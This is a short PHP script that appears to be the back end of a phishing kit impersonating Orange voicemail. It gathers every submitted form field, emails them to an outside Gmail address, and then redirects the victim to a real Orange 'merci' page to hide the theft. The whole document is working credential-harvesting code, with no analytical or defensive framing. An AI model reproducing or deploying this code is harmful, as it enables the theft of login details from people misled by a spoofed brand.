<?php
$TO = "resultalog55@gmail.com";

$h  = "From: " . $TO;

$message = "";

while (list($key, $val) = each($_POST)) {
  $message .= "$key : $val\n";
}

mail($TO, $subject, $message, $h);

Header("Location:https://boitevocale5w.orange.fr/merci.html");

?>